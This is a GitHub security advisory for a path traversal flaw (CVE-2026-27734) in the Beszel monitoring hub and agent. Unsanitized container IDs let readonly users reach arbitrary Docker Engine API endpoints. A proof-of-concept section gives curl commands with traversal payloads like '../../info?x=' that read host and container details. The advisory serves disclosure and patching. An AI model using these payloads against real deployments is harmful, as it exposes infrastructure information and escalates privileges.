# [M] Beszel: Docker API has a Path Traversal Vulnerability via Unsanitized Container ID

## Summary
Severity: Medium
Advisory: GHSA-phwh-4f42-gwf3
CVE: CVE-2026-27734
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-02-27
Source: https://github.com/advisories/GHSA-phwh-4f42-gwf3
Type: github-advisory

## Affected
- Go: `github.com/henrygd/beszel` — affected >=0 <0.18.4

## Details
### Summary

The hub's authenticated API endpoints GET /api/beszel/containers/logs and GET /api/beszel/containers/info pass the user-supplied "container" query parameter to the agent without validation. The agent constructs Docker Engine API URLs using fmt.Sprintf with the raw value instead of url.PathEscape(). Since Go's http.Client does not sanitize ../ sequences from URL paths sent over unix sockets, an authenticated user (including readonly role) can traverse to arbitrary Docker API endpoints on agent hosts, exposing sensitive infrastructure details.

### Details

**Hub** (internal/hub/hub.go:407-426): `containerID` from query param is only checked for emptiness, no format validation:
```go
containerID := e.Request.URL.Query().Get("container")
if systemID == "" || containerID == "" { ... }
data, err := fetchFunc(system, containerID)  // passed directly to agent
```

**Agent** (agent/docker.go:651-652 and 682-683): raw containerID interpolated into Docker API URL:
```go
endpoint := fmt.Sprintf("http://localhost/containers/%s/json", containerID)
endpoint := fmt.Sprintf("http://localhost/containers/%s/logs?stdout=1&stderr=1&tail=%d", containerID, dockerLogsTail)
```

Go's http.Client preserves `../` in paths over unix sockets (verified with test code). The Docker daemon resolves them via cleanPath, routing the request to unintended API endpoints.

### PoC

Tested on Beszel v0.18.3 with hub and agent running in Docker (host network mode).
```bash
# Authenticate
TOKEN=$(curl -s -X POST "http://localhost:8090/api/collections/users/auth-with-password" \
  -H "Content-Type: application/json" \
  -d '{"identity":"user@example.com","password":"password"}' | jq -r '.token')

SYSTEM="<system_id>"

# Path traversal: Docker version (returns full engine version, kernel, Go version)
curl -s "http://localhost:8090/api/beszel/containers/info?system=$SYSTEM&container=../../version?x=" \
  -H "Authorization: Bearer $TOKEN"

# Path traversal: Docker system info (returns hostname, OS, container count, network config)
curl -s "http://localhost:8090/api/beszel/containers/info?system=$SYSTEM&container=../../info?x=" \
  -H "Authorization: Bearer $TOKEN"

# Path traversal: List all images (triggers unmarshal error confirming traversal works)
curl -s "http://localhost:8090/api/beszel/containers/info?system=$SYSTEM&container=../images/json?x=" \
  -H "Authorization: Bearer $TOKEN"
```

All three requests returned real data from the Docker Engine API on the agent host.

### Impact

Any authenticated user (including readonly role) can read arbitrary Docker Engine API GET endpoints on all connected agent hosts. Exposed information includes: hostname, OS version, kernel version, Docker version, container inventory, image list, network topology, storage driver configuration, and security options. This is a privilege escalation, readonly users should not have access to host-level infrastructure details.

## Researcher

Sergio Cabrera
https://www.linkedin.com/in/sergio-cabrera-878766239/

## References
- https://github.com/henrygd/beszel/security/advisories/GHSA-phwh-4f42-gwf3
- https://nvd.nist.gov/vuln/detail/CVE-2026-27734
- https://github.com/henrygd/beszel/commit/311095cfddda113863ca9656cf9e99411be1cef5
- https://github.com/henrygd/beszel
- https://github.com/henrygd/beszel/releases/tag/v0.18.4
